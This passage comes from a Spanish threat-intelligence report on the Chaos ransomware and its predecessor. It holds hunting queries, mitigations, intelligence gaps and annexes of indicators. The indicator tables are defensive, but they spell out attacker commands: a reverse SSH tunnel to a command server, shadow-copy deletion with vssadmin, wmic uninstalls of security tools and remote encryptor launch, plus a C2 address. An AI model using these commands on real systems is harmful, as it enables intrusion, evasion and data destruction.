// (d) wininit.exe fuera de System32 — trivial y muy especifico
DeviceProcessEvents
| where Timestamp > ago(365d)
| where FileName =~ "wininit.exe"
| where not(FolderPath has @"\Windows\System32\")
| project Timestamp, DeviceName, FolderPath, ProcessCommandLine, SHA256
```

```bash
# =====================================================================
# H-10 · LA CONSULTA QUE HAY QUE HACER PRIMERO, y no busca al
# adversario: busca un corte autoinfligido nuestro.
#
# Seis direcciones del aviso oficial AA23-061A pertenecen a operadores
# de banda ancha de Colombia y Argentina. Si entraron en una lista de
# bloqueo, estamos cortando trafico legitimo de clientes de Tigo, Claro
# y Telecom Argentina.
#
# El propio aviso lo pide: "algunas de las direcciones observadas tienen
# varios anos; el FBI y CISA recomiendan examinarlas o investigarlas
# antes de emprender acciones a futuro, como el bloqueo".
# =====================================================================

cat > /tmp/no_bloquear.txt <<'EOF'
181.141.3.126      # UNE EPM Telecomunicaciones S.A. (Colombia)
186.86.212.138     # Telmex Colombia S.A.
181.164.194.228    # Telecom Argentina S.A.
190.193.180.228    # Telecom Argentina S.A.
186.64.67.6        # NODOSUD S.A (Argentina)
179.43.167.10      # Private Layer Inc  <- la unica que SI es alojamiento
EOF

# Revisar contra las listas de bloqueo propias, en todas sus formas:
#   - objetos de direccion y grupos del cortafuegos
#   - listas de reputacion cargadas en el proxy
#   - indicadores ingeridos en la plataforma de inteligencia
#   - y los agregados ioc_ipv4.txt de ESTE repositorio, por si acaso
#
# Las cinco primeras: QUITAR. Son terceros comprometidos, y el valor de
# bloquearlas hoy es nulo mientras el coste es un corte de trafico
# legitimo de la region para la que se escribe este informe.
#
# La sexta (Private Layer Inc) es un proveedor de alojamiento y la
# decision es distinta: se puede bloquear con el mismo criterio que
# cualquier otro proveedor de alojamiento a prueba de balas, y esa es
# una decision de politica, no de este informe.

grep -F -f <(awk '{print $1}' /tmp/no_bloquear.txt) ioc_ipv4.txt \
  && echo "ATENCION: alguna de las seis esta en el agregado plano" \
  || echo "OK: ninguna de las seis esta en ioc_ipv4.txt"
```

## X-5. Mitigaciones de configuración con efecto directo

Cinco. **Ninguna exige comprar un producto de seguridad**, y la primera no es técnica.

### X-5.1 — La regla de la mesa de ayuda · **la medida de mayor efecto del informe**

Desarrollada en `E-2`. Tres piezas: una regla enunciable en una frase —**el soporte informático nunca pide iniciar una sesión de asistencia remota en una llamada que el usuario no ha abierto por el canal oficial**—, un canal oficial único para que la frase tenga referente, y **permiso explícito para colgar**.

**Es la única medida que corta el vector inicial del sucesor**, y la única de las cinco que no tiene dueño natural en Seguridad. *Coste: organizativo.*

### X-5.2 — Restringir `Quick Assist` y gobernar las herramientas de administración remota

Dos piezas:

1. **Si `Quick Assist` no es requisito de negocio, restringirlo por política de dispositivo.** Elimina el paso 4 de la cadena.
2. **Una lista de herramientas de administración remota aprobadas**, y una alerta cuando aparezca una que no lo esté. Las cinco que el sucesor usa —AnyDesk, ScreenConnect, OptiTune, Syncro RMM, Splashtop— **son productos legítimos**, de modo que la pregunta útil no es qué está prohibido sino **qué está aprobado**.

**Y la salvedad honesta:** en organizaciones que subcontratan soporte, alguna de esas cinco **es** la herramienta del proveedor. Por eso el control es una lista de aprobadas y no un bloqueo.

### X-5.3 — Proteger la desinstalación de los controles de seguridad

El sucesor intenta **desinstalar la aplicación de segundo factor por `wmic`**; el predecesor desactivaba el antivirus **por objeto de directiva de grupo desde el controlador de dominio**. Las dos defensas correspondientes:

1. **Protección contra alteración** en el agente de detección del puesto, y contraseña o vale para desinstalarlo.
2. **Y vigilancia de los objetos de directiva de grupo**, porque la vía del predecesor no pasa por el puesto: pasa por el dominio, con una cuenta de administrador legítima. **Un control del puesto no defiende contra un cambio de directiva.**

### X-5.4 — Segmentación de red · **la que decide el alcance del daño**

El cifrador, en modo de red, **enumera las interfaces, identifica los rangos privados, genera la lista de todos los anfitriones de cada subred descubierta, se conecta por SMB y encola los recursos compartidos**, excluyendo sólo los administrativos. No necesita al operador para propagarse.

**La consecuencia es que la segmentación deja de ser una buena práctica y pasa a ser el factor que determina cuántos sistemas se cifran.** Y la pregunta que hay que poder responder antes del incidente es concreta: *¿cuántos anfitriones y cuántos recursos compartidos alcanzaría un proceso con credenciales de un puesto cualquiera?*

**Es la medida más cara del informe** —es un proyecto, no una casilla— y la única cuyo retorno es proporcional al daño evitado y no a la probabilidad del incidente.

### X-5.5 — Copias de seguridad fuera del alcance del cifrador, y del hipervisor

Tres requisitos, y el tercero es el que este expediente añade:

1. **Copias que no sean alcanzables desde un recurso compartido de red**, porque el cifrador los enumera y los encola.
2. **Copias inmutables o fuera de línea**, porque el borrado de copias de sombra es la primera acción de impacto en las dos generaciones.
3. **Y copias que cubran el hipervisor y el almacenamiento en red**, porque el cifrador del sucesor se anuncia compatible con **ESXi, Linux y almacenamiento en red** además de Windows. Un plan que trate la plataforma de virtualización como refugio ha dejado de ser válido.

> ⚠ **Y la mitigación que este informe NO recomienda, por si alguien la
> espera: cargar los indicadores del aviso oficial en un bloqueo
> automático.** El aviso es una fuente excelente y sus TTP son la base de
> media este documento. Pero **seis de sus setenta y una direcciones son
> rangos de banda ancha de operadores colombianos y argentinos**, el propio
> aviso pide investigarlas antes de bloquear, y la operación a la que
> pertenecían está desarticulada desde julio de 2025. **El valor de
> bloquearlas hoy es nulo y el coste es un corte de tráfico legítimo de la
> región para la que se escribe este informe.** Es `H-10`, y es la primera
> consulta que hay que ejecutar.

---

## 14. Brechas de inteligencia y nuevos requisitos de colección

| Id | Brecha | Por qué importa | Cómo se cierra | Coste |
|---|---|---|---|---|
| `G-1` | **No hay víctimas latinoamericanas documentadas de ninguna de las dos generaciones** | Decide el juicio de exposición regional. Y el sesgo estructural es conocido: **un sitio de filtración sólo publica a quien no paga** | Consulta a CSIRT nacionales y al foro regional; y a los registros de notificación de brechas donde existan | Medio |
| `G-2` | **No se localizó un comunicado oficial detallado de `Operation Checkmate`** | Las cifras de servidores, dominios y criptomoneda vienen de cobertura, no de fuente oficial. **Y las propias fuentes señalan la ausencia del comunicado** | Nota del Departamento de Justicia o de Europol, si se publica | Bajo |
| `G-3` | No sabemos si hubo **detenciones** posteriores | Cerraría la pregunta central de `E-1`: si el personal sigue libre, el patrón del `Anexo D` se confirma | Vigilancia de comunicados judiciales | Bajo |
| `G-4` | No tenemos los **paquetes STIX** del aviso oficial procesados | El aviso publica **tres paquetes STIX** —marzo y noviembre de 2023, y agosto de 2024—, que son **la fuente preferente para ingesta** y permitirían poblar el Anexo A sin transcribir nada a mano | Descargar y procesar, **con el filtro de `A.5` aplicado antes** | **Bajo, y es la más rentable de la lista** |
| `G-5` | No sabemos si el parámetro en portugués aparece en otras muestras | Es `KJ-9`, y una segunda aparición lo convertiría de curiosidad en indicio | Búsqueda en repositorios de muestras; o preguntar al autor del análisis | Bajo |
| `G-6` | **No sabemos si existe la regla de la mesa de ayuda** | Es la medida más importante del informe | **Una pregunta** | **Trivial** |
| `G-7` | **No sabemos si las seis direcciones de `A.5` están en alguna lista de bloqueo nuestra** | Es un corte autoinfligido en curso, si lo están | `H-10` | **Trivial, y hay que hacerla primero** |
| `G-8` | No sabemos cuántos anfitriones alcanzaría el cifrador en nuestra red | Es el alcance del daño | Un ejercicio de alcance sobre el diseño de red | Medio |

**Disparadores de reevaluación.** `I-1`: **detenciones** relacionadas con cualquiera de las dos generaciones. `I-2`: **una víctima brasileña**, que refutaría la lista de exclusiones como política efectiva y cambiaría el juicio para toda la región. `I-3`: una segunda aparición del parámetro en portugués, o cualquier dato que sitúe desarrollo o afiliados de habla portuguesa. `I-4`: reanudación de actividad **bajo el nombre BlackSuit**, que indicaría que la marca no se abandonó. `I-5`: publicación de una valoración del vínculo con **confianza alta** por cualquier fuente, que permitiría elevar `KJ-4` y `H-A`. `I-6`: aparición de una víctima latinoamericana de `Chaos`. `I-7`: una tercera generación del linaje, que convertiría el patrón de `E-1` en una serie.

---

# ANEXOS

## Anexo A — Indicadores de compromiso

> ⚠ **`PAP:AMBER` — y este anexo lleva la advertencia más concreta de toda la
> cartera, porque el riesgo no es hipotético.** **`A.5` contiene seis
> direcciones del aviso oficial `AA23-061A` que pertenecen a operadores
> latinoamericanos, y cinco de las seis son rangos de banda ancha de UNE EPM,
> Telmex Colombia, Telecom Argentina y NODOSUD** — verificado por consulta
> propia al registro regional el 2026-11-19. El propio aviso advierte de que
> sus direcciones «tienen varios años» y pide investigarlas antes de
> bloquear. **Cargarlas en un bloqueo automático corta tráfico de clientes de
> Tigo, Claro y Telecom Argentina.** Se consignan con tipo `artefacto` y no
> `ipv4`, precisamente para que **no entren en los agregados planos** de este
> repositorio, y la primera consulta de caza del informe (`H-10`) sirve para
> comprobar si entraron en alguna lista propia.
>
> **Tres advertencias más.** (1) **`A.6` son herramientas legítimas**: cinco
> productos de administración remota, `Quick Assist` —que viene con
> Windows—, `GoodSync`, `Impacket` y el cliente `OpenSSH` del sistema. El
> criterio no es el binario: es la aprobación y el contexto. (2) **La
> operación del predecesor está desarticulada desde julio de 2025**, de modo
> que sus indicadores de red tienen valor retrospectivo y poco más. (3) **Los
> indicadores de mayor valor de este anexo no son direcciones ni hashes**: son
> los cinco artefactos de anfitrión de `A.2` y la señal de `A.1`, y ninguno
> caduca.

### A.1 — El artefacto que decide, y no es técnico · **leer primero**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| pattern | **`quickassist.exe` ejecutado en un puesto, tras una llamada telefónica entrante que el usuario no inició** | **El vector de acceso inicial del sucesor, y el único punto de la cadena donde se puede cortar.** La secuencia completa es: inundación de correo basura → la víctima llama → el operador suplanta a seguridad informática → le pide lanzar `Quick Assist` → le pide conectarse a su sesión. **Los pasos 1 a 4 no dejan ningún artefacto distinguible**: el correo basura es correo basura, la llamada no pasa por ningún sistema nuestro, y `Quick Assist` es un ejecutable firmado por Microsoft cuyo uso legítimo es exactamente ése | **Alta como señal; requiere confirmación con el usuario** | **Sin caducidad.** Es el diferencial del adversario y no puede abandonarlo sin perder su acceso inicial | **Registrar siempre y PREGUNTAR AL USUARIO** (`D-1`). No es automatizable a un veredicto. **Y la medida preventiva es mejor que la detección**: la regla de la mesa de ayuda (`X-5.1`) y la restricción de `Quick Assist` (`X-5.2`) |
| pattern | **Pico de correo basura hacia un buzón concreto**, en volumen muy superior a su línea base, en las 24-48 h previas | **Es el paso 1 de la cadena, y lo único de los cuatro primeros pasos que SÍ deja rastro en un sistema nuestro.** Usado como filtro, convierte la consulta de `quickassist.exe` de ruidosa en una lista corta | Media | Sin caducidad como método | **Correlación** (`D-1`), no alerta por sí sola |
| pattern | **`wmic product where name=<...> call uninstall /nointeractive`** contra una aplicación de segundo factor o un control de seguridad | **LA SEÑAL DE ORO del expediente.** En las dos generaciones esta fase precede **inmediatamente** al cifrado: no es un indicio de compromiso, es un aviso de que el reloj está corriendo. Coste de falso positivo prácticamente nulo, porque una desinstalación planificada pasa por un cambio aprobado y se excluye por ventana | **Alta** | **Sin caducidad** | **Incidente con prioridad máxima** (`D-2`) |
| pattern | Modificación de un **objeto de directiva de grupo que desactiva el antivirus**, originada en el controlador de dominio con una cuenta de administrador legítima | La vía equivalente del **predecesor**, y conviene tenerla aparte porque **no pasa por el puesto**: un control del endpoint no defiende contra un cambio de directiva | Alta | Sin caducidad | **Detección** (`X-5.3`) |

### A.2 — Artefactos de anfitrión · **los indicadores duraderos de este expediente**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| pattern | Valor `REG_DWORD` a `0` bajo `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist` | **Oculta una cuenta de la pantalla de inicio sin eliminarla**: sigue sirviendo para entrar por RDP o con `runas`. Persistencia pura, y en la mayoría de los entornos **no hay nada legítimo en esa clave** | **Alta** | Sin caducidad | **Detección** (`D-3`) |
| pattern | `net.exe user <cuenta> <contraseña> /dom` sobre **tres o más cuentas de dominio en una ventana corta** | Restablecimiento masivo de contraseñas de cuentas enumeradas, para asegurar acceso continuado. **Es ruidoso si alguien escucha** | Alta | Sin caducidad | **Detección** (`D-5`) |
| filename | **`wininit.exe` ejecutándose desde una ruta que no es `C:\Windows\System32`** | Herramienta de subida a nube renombrada con el nombre de un binario de sistema. **Buscarlo fuera de `System32` es trivial y muy específico** | **Alta** | Sin caducidad | **Detección** (`D-5`) |
| pattern | Optimización de entrega de Windows configurada contra un **servidor local en el puerto 8005**, para ficheros de más de 50 MB | **Abuso de la infraestructura de distribución de parches de la víctima para repartir las herramientas del adversario entre sus propios equipos.** No es sigilo, es eficiencia — y no tiene uso legítimo con un puerto no estándar | Media-alta | Sin caducidad | **Detección** (`D-5`) |
| pattern | Borrado de los **registros de eventos de PowerShell** | Evasión del sucesor. El predecesor borraba los de aplicación, sistema y seguridad | Alta | Sin caducidad | **Detección** |
| pattern | `cmd.exe /c vssadmin delete shadows /all`, **incluida la variante ofuscada** en la que cada carácter se almacena como byte seguido de `0x0E` y se descifra en ejecución | Borrado de copias de sombra. **Es la fase de impacto más tardía y más fácil de detectar**: si se llega aquí, el cifrado es inminente o ya empezó | **Alta** | Sin caducidad | **Detección**, con la advertencia de que es tarde |
| filename | Extensión **`.chaos`** y nota **`readme.chaos.txt`** | Cifrado consumado. La nota **no contiene demanda inicial ni instrucciones de pago**: sólo una URL `.onion` distinta para cada víctima, y la afirmación de que el actor «intentó realizar pruebas de seguridad» en el entorno | Alta | Sin caducidad | **Confirmación.** Y **ejecutar el `Anexo D` de `CTI-2026-039` antes de restaurar** |
| pattern | Ficheros con **60 bytes de metadatos anexados**, terminando en una clave pública en formato `ECCPUBLICBLOB` más identificador de algoritmo y tamaño de clave | **Es la firma para medir el alcance real del cifrado**, más fiable que la extensión, porque sobrevive a un renombrado | Alta | Sin caducidad | **Medición de alcance** en respuesta a incidentes |
| pattern | `ldapsearch` ejecutado **a través de un túnel inverso de SSH**, con volcado del directorio activo a un fichero de texto | Acceso a credenciales. Probable preparación de *kerberoasting* | Media-alta | Sin caducidad | **Detección** |
| path | *(predecesor)* Ficheros `.bat` y un **archivo 7zip cifrado** en `C:\Temp\`, `%APPDATA%\`, `C:\ProgramData\`, `C:\Users\<usuario>\` o **la raíz de `C:\`** | El lote del predecesor crea un administrador nuevo, fuerza actualización de directiva, pone claves de autoextracción, ejecuta el cifrador, vigila el proceso y **borra los registros al terminar** | Alta | Histórico | **Detección y búsqueda retrospectiva** |

### A.3 — Mando y control y exfiltración

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| ipv4 | `45.61.134[.]36` | **Servidor de mando y control del sucesor**, contactado por túnel inverso de SSH **en el puerto 443** con reenvío del puerto remoto 12840 | Alta | 2027-05-19 | **Bloqueo** y búsqueda retrospectiva |
| pattern | `ssh.exe -R :12840 -N <usuario>@<servidor> -p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no` | **La línea de órdenes completa del túnel**, con el cliente `OpenSSH` que **viene con Windows**: el adversario no instala nada. **Tres condiciones juntas —`-R`, `StrictHostKeyChecking=no` y puerto 443— no tienen falsos positivos conocidos** | **Alta** | Sin caducidad como patrón | **Detección** (`D-4`), ejecutable **sin inspección de tráfico**: basta la línea de órdenes |
| email | `win88@thesecure[.]biz` | **Dirección de soporte que el sucesor publica en su anuncio de reclutamiento de afiliados** en el foro de habla rusa. Es material de identificación de la operación, no de detección en el puesto | Alta | **Corta**: una dirección de contacto de foro se cambia sin coste | **Contexto / pivote** |
| pattern | Orden de subida con filtrado **`--max-age 1y`** y exclusión de `psd, 7z, mox, pst, FIT, FIL, MOV, mdb, iso, exe, dll, wav, png, db, log, HEIC, dwg, tmp, vhdx, msi` | **La exfiltración es SELECTIVA, y lo que excluye es el dato interesante**: deja fuera **archivos de correo de Outlook (`pst`)**, **bases de datos (`mdb`)** e imágenes de disco virtual (`vhdx`). No es lo que hace una doble extorsión típica. **Consecuencia práctica: una organización cuyo activo crítico esté en un archivo de correo o en una base de datos no lo perdería en esta exfiltración — aunque sí lo perdería en el cifrado** | Alta | Sin caducidad como patrón | **Detección** (`D-5`) y **evaluación de daño real** en respuesta a incidentes |
| pattern | `/lkey:"<clave de 32 bytes>" /encrypt_step:<0-100> /work_mode:<local\|network\|local_network> /ignorar_arquivos_grandes` | **La línea de órdenes del cifrador.** `/encrypt_step` es el porcentaje de cifrado selectivo, **con 30 % por omisión**, y es el mecanismo que `KJ-4` identifica como la continuidad con el predecesor. **Y `/ignorar_arquivos_grandes` está en portugués** (`KJ-9`) | **Alta** | Sin caducidad | **Detección de la ejecución del cifrador**, y base del vínculo de `KJ-4` |
| pattern | `wmic /node:<anfitrión> process call create "<ruta>\encryptor.exe /lkey:... /encrypt_step:40 /work_mode:local_network"` | **Despliegue remoto del cifrador.** El valor `40` es el observado en el caso que Talos investigó | Alta | Sin caducidad | **Detección**, y es tarde |

### A.4 — Criptografía y artefactos del cifrador

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| clave | XOR de **25 bytes** para descifrar la nota de rescate: `e2 80 9a d0 a3 28 65 d1 97 d0 b9 d0 94 09 3e d1 85 d1 86 1d 01 e2 80 b9 e2` | **Clave fija, y por tanto el indicador más duradero del cifrador**: cambiarla obliga a recompilar. La nota se descifra en trozos de cinco bytes con un patrón distinto de la clave, y ocupa 1.310 bytes | Alta | Sin caducidad mientras no cambie el linaje | **Firma de memoria y de fichero** |
| pattern | **ECDH sobre `Curve25519` + AES-256**, con par de claves generado por ejecución con la interfaz criptográfica de Windows, **clave privada sólo en memoria** y pública exportada en `ECCPUBLICBLOB`; **clave distinta por fichero** derivada por acuerdo de claves combinado con la clave maestra del operador | **Define la recuperabilidad, y la respuesta es que no hay ninguna sin la clave del operador.** Donde un esquema de clave única admite la esperanza de un fallo de implementación, uno de clave por fichero no. **La única vía es la copia de seguridad** | Alta | Sin caducidad | **Evaluación de recuperabilidad.** Es el dato que Dirección necesita el primer día |
| pattern | Antianálisis: enumeración de **clases y títulos de ventana** para detectar depuradores; enumeración de procesos para máquinas virtuales, entornos aislados y herramientas de análisis; **y comparación por hash contra firmas precomputadas para no almacenar los nombres en claro**. Termina de inmediato al detectar cualquiera | **Una decisión de diseño contra el analista, no contra el producto de seguridad.** Un análisis estático de cadenas **no revela qué está evadiendo**, y la lista sólo se ve ejecutándolo, que es lo que no se puede hacer. **Conviene saberlo antes de intentar un análisis dinámico** | Alta | Sin caducidad | **Contexto para el análisis forense** |
| pattern | Exclusiones de cifrado: carpetas `Windows`, `boot`, `system volume information`, `perflogs`, `Mozilla`, `google`, `tor browser`, `Appdata`, `msocache`, `intel`, `$recycle.bin`, `windows.old`, `$windows.~ws`, `$windows.~bt`; ficheros `bootsect.bak`, `boot.ini`, `ntldr`, `bootfont.bin`, `ntuser.dat`, `autorun.inf`, `desktop.ini`, `ntuser.ini`, `diagpkg`, `diagcab`, `diagcfg`, `msstyles`, `themepack`, `deskthemepack`, `theme`, `icns`, `lock`, `nomedia`, los **sin extensión**, y los ya cifrados con `.chaos` | **Las exclusiones son para no romper el sistema**: el adversario necesita que la víctima pueda arrancar y leer la nota. Es material de identificación del cifrador y de comprensión del alcance | Alta | Sin caducidad | **Contexto** |
| pattern | Escalada: si falla el acceso normal, **modifica los descriptores de seguridad** y suplanta vales de proceso enumerando `svchost.exe` y `explorer.exe` | **Los permisos de ficheros no son una defensa** contra este cifrador | Alta | Sin caducidad | **Contexto** |
| pattern | Propagación en modo de red: enumera interfaces, identifica rangos privados, **genera la lista de todos los anfitriones de cada subred**, conecta por SMB y encola los recursos compartidos, **excluyendo sólo `ADMIN$`, `C$` e `IPC$`** | **Lo hace el cifrador, no el operador.** Convierte la contención en una carrera y hace de la segmentación el factor que decide el alcance del daño (`X-5.4`) | **Alta** | Sin caducidad | **Base del ejercicio de alcance de `G-8`** |

### A.5 — Direcciones del aviso oficial registradas a operadores latinoamericanos · **NO BLOQUEAR** · verificación propia 2026-11-19

> ⚠ **Esto no es material de la fuente: es una verificación propia, y es el
> hallazgo más accionable de este informe.** De las **setenta y una**
> direcciones IP que el aviso conjunto `AA23-061A` publica en sus tablas de
> indicadores, **seis están registradas a entidades latinoamericanas**. La
> consulta RDAP al registro regional, ejecutada por esta célula el día de
> emisión, identifica a sus titulares, y **cinco de las seis son operadores
> de banda ancha**, no proveedores de alojamiento.
>
> **Qué significa.** Una dirección de banda ancha residencial o de empresa en
> la tabla de indicadores de una operación de extorsión es, con práctica
> certeza, **un equipo de un tercero comprometido usado como tránsito**, no
> infraestructura del adversario. La región aparece aquí **como
> infraestructura y no como victimología** — la misma casilla de *trayecto*
> que `CTI-2026-036` identificó para otro adversario.
>
> **Y qué hay que hacer.** El propio aviso lo pide: «algunas de las
> direcciones observadas tienen varios años; el FBI y CISA recomiendan
> examinarlas o investigarlas antes de emprender acciones a futuro, como el
> bloqueo». **Bloquear las cinco primeras corta tráfico de clientes de Tigo,
> Claro, Telecom Argentina y un operador regional argentino**, y la operación
> a la que pertenecían está desarticulada desde julio de 2025: el valor de
> bloquearlas hoy es nulo. Se consignan con tipo **`artefacto`** para que
> **no entren en los agregados planos de este repositorio**, y `H-10` es la
> consulta que comprueba si entraron en alguna lista propia.
>
> **Límite del método, declarado:** una consulta de registro establece a quién
> está asignado el bloque, **no quién usaba la dirección**. Que
> `186.86.212[.]138` esté en un bloque de Telmex Colombia no dice de qué
> cliente era el equipo ni confirma que estuviera comprometido; lo segundo es
> una inferencia, muy sólida pero inferencia.

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| artefacto | `181.141.3[.]126` | Bloque `181.136.0.0/13`, registrado a **UNE EPM Telecomunicaciones S.A.** (Colombia; contactos administrativos de Tigo Colombia). **Banda ancha.** Última actividad observada por el FBI: noviembre de 2022 | **Alta como registro; nula como indicador accionable hoy** | Histórico | **NO BLOQUEAR.** Búsqueda retrospectiva con verificación previa |
| artefacto | `186.86.212[.]138` | Bloque `186.84.0.0/14`, registrado a **Telmex Colombia S.A.** **Banda ancha.** Última actividad observada: noviembre de 2022 | Alta como registro; nula como indicador | Histórico | **NO BLOQUEAR** |
| artefacto | `181.164.194[.]228` | Bloque `181.164.0.0/14`, registrado a **Telecom Argentina S.A.** **Banda ancha.** Última actividad observada: noviembre de 2022 | Alta como registro; nula como indicador | Histórico | **NO BLOQUEAR** |
| artefacto | `190.193.180[.]228` | Bloque `190.192.0.0/15`, registrado a **Telecom Argentina S.A.** **Banda ancha** | Alta como registro; nula como indicador | Histórico | **NO BLOQUEAR** |
| artefacto | `186.64.67[.]6` | Bloque `186.64.64.0/19`, registrado a **NODOSUD S.A** (operador regional argentino). **Banda ancha.** Última actividad observada: noviembre de 2022 | Alta como registro; nula como indicador | Histórico | **NO BLOQUEAR** |
| artefacto | `179.43.167[.]10` | Bloque `179.43.128.0/18`, registrado a **PRIVATE LAYER INC**. **Es la única de las seis que es un proveedor de alojamiento y no un operador de banda ancha**, y por tanto la única cuya decisión de bloqueo es distinta: se puede tratar con el mismo criterio que cualquier otro proveedor de alojamiento permisivo, y eso es **una decisión de política, no de este informe** | Alta como registro | Histórico | **Decisión de política de alojamiento**, no bloqueo por este informe |
| cartera | **Advertencia literal del aviso oficial**: «algunas de las direcciones observadas tienen varios años. El FBI y CISA recomiendan examinar o investigar estas direcciones IP antes de emprender acciones a futuro, como el bloqueo» | **La fuente que publica los indicadores advierte ella misma de que no se deben bloquear sin verificar.** Se consigna porque es la respuesta a cualquiera que pregunte por qué este informe saca seis direcciones de un aviso gubernamental de los agregados | **Oficial** | — | **Citable.** Es el fundamento de `H-10` |

### A.6 — Herramientas legítimas · **NO SON MALIGNAS**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| herramienta | **`Quick Assist`** (`quickassist.exe`) | **Herramienta de asistencia remota incluida en Windows.** Es el vector inicial del sucesor, y su uso legítimo es exactamente el que el adversario le da. **No se puede tratar como malware** | — | — | **Restringir si no es requisito** (`X-5.2`); registrar su uso y preguntar (`D-1`) |
| herramienta | **AnyDesk · ScreenConnect · OptiTune · Syncro RMM · Splashtop streamer** | **Cinco productos legítimos de administración remota**, usados para persistir. **En organizaciones que subcontratan soporte, alguno de los cinco ES la herramienta del proveedor.** Por eso el control es una lista de **aprobadas** y no un bloqueo | — | — | **Inventario y lista de aprobadas** (`X-5.2`). **No bloquear por este informe** |
| herramienta | **`GoodSync`** | Software legítimo de sincronización y respaldo, usado para exfiltrar | — | — | **Inventario.** Alertar si aparece sin aprobación |
| herramienta | **Cliente `OpenSSH` de Windows** (`C:\Windows\System32\OpenSSH\ssh.exe`) | **Viene con el sistema operativo.** El adversario monta su túnel de mando y control sin instalar nada. El criterio es la **línea de órdenes**, no el binario | — | — | **Detección por parámetros** (`D-4`). No bloquear |
| herramienta | `Impacket` (`atexec`) · `ldapsearch` | Herramientas públicas y legítimas de administración y de prueba de intrusión | — | — | **Detección por contexto** |
| herramienta | *(predecesor)* `Chisel` · `PuTTY` · `MobaXterm` · `SharpShares` · `SoftPerfect NetWorx` · herramientas de Nirsoft · `PowerTool` · `GMER` · `RClone` | Conjunto del predecesor según el aviso oficial. **Todas legítimas o públicas**, y por eso el aviso las lista aparte en su tabla de «software legítimo usado por los actores» | — | — | **Inventario y detección por contexto** |
| herramienta | *(predecesor)* `Mimikatz` · `Cobalt Strike` · `Brute Ratel` · `SystemBC` · `Gootloader` · `Ursnif`/`Gozi` | Las seis **no** son legítimas, y se listan aquí para separarlas de las anteriores: su presencia es señal, no ruido | Alta | Sin caducidad | **Detección** |

### A.7 — Material de atribución y de contexto · **no son indicadores operativos**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| artefacto | **`/ignorar_arquivos_grandes`** | **Hallazgo propio: el único parámetro del cifrador que no está en inglés, y está en PORTUGUÉS** —en español sería *archivos*, con `ch`—. El resto (`/lkey`, `/encrypt_step`, `/work_mode`, `/path`) está en inglés. **No es atribución**: identifica el idioma de quien escribió una línea de código, no la nacionalidad del operador ni el patrocinio. Precedente metodológico: el campo `dhj_exe` de `CTI-2026-043`. **La tensión que merece quedar escrita**: un parámetro en portugués en el cifrador de un grupo que se promociona en un foro de habla rusa y que **declara excluir a Brasil de su victimología** | **Baja; es observación propia** | Sin caducidad | **Requisito de colección** (`I-3`). No usar para atribuir |
| artefacto | **Lista de exclusión declarada por el actor: países BRICS y de la Comunidad de Estados Independientes, hospitales y entidades de gobierno** | Publicada por el propio grupo en su anuncio de reclutamiento de afiliados. **Cubre a Brasil por pertenencia a BRICS y a ningún otro país de la región.** Es declaración del adversario, no hecho verificado, y en un modelo de afiliados la marca sólo puede imponerla **después** del ataque, expulsando. `E-4` desarrolla cómo leerla | Media | **Volátil**: una política de marca se cambia en un mensaje | **Contexto de victimología.** `I-2` es su disparador de refutación |
| artefacto | **Modelo de negocio del sucesor**: extorsión como servicio, promocionada en el foro de habla rusa `RAMP`, con panel automatizado de gestión de objetivos y comunicaciones, y **cuota de entrada reembolsable con el primer cobro** | Material de evaluación de capacidad. **La cuota reembolsable es el detalle revelador**: alinea el interés de la marca con el del afiliado y filtra a los que no esperan cobrar | Alta | — | **Contexto** |
| artefacto | **Esquema de extorsión**: rescate de **300.000 dólares** en el caso investigado; nota **sin demanda inicial ni instrucciones de pago**, sólo una URL `.onion` por víctima; y si paga, descifrador **más un informe detallado de la prueba de intrusión realizada**; si no paga, publicación de los datos **más denegación de servicio contra todos los servicios expuestos a Internet** y difusión de la brecha a competidores y clientes | **El informe de prueba de intrusión como contraprestación es inusual y dice algo del posicionamiento**: el actor insiste en la nota en que «intentó realizar pruebas de seguridad» en el entorno. Y la triple amenaza —datos, denegación de servicio y reputación— es una escalada respecto al predecesor | Alta | — | **Contexto para negociación y para Dirección** |
| artefacto | **Colisión deliberada de nombre con la herramienta constructora llamada Chaos** | Talos declara que el grupo **no tiene relación** con las variantes de ese constructor ni con sus desarrolladores, y que **usa el mismo nombre para crear confusión**, explotando «la confusión en la comunidad de seguridad respecto al nombre». **Es la primera colisión de nombres INTENCIONADA que documenta esta cartera**: `CTI-2026-035` desambiguó cuatro cosas llamadas «Medusa» que coincidían por accidente | Alta | Sin caducidad | **Advertencia de ingesta**: una búsqueda de «Chaos ransomware» devuelve material de otra cosa |
| artefacto | **Correspondencia del mecanismo de cifrado parcial** entre el aviso oficial del predecesor —«enfoque único que permite al actor elegir un porcentaje específico de datos de un fichero a cifrar», bajándolo en los grandes para evadir detección y ganar velocidad— y el parámetro `/encrypt_step` del sucesor, con 30 % por omisión y opción separada para ficheros grandes | **El mecanismo concreto que hace auditable la valoración de Talos** (`KJ-4`, `O-2.2`). No es una coincidencia de concepto: lo que coincide es que **el porcentaje sea un parámetro del operador con valor por omisión**, que es una decisión de diseño de interfaz. **Y es refutable en quince minutos leyendo dos documentos públicos** | **Media; es inferencia propia** | Sin caducidad | **Base de atribución, y escrita para ser atacada** (`Anexo H`, punto 1) |

## Anexo B — Fuentes y valoración

> Valoración doble tipo Admiralty/OTAN, más el **grado de establecimiento** que `CTI-2026-039` propuso —oficial, proveedor, propio— y la **fecha de la actividad** separada de la de publicación.

| Fuente | Disciplina | Fiab. | Cred. | Grado | Notas de sesgo |
|---|---|---|---|---|---|
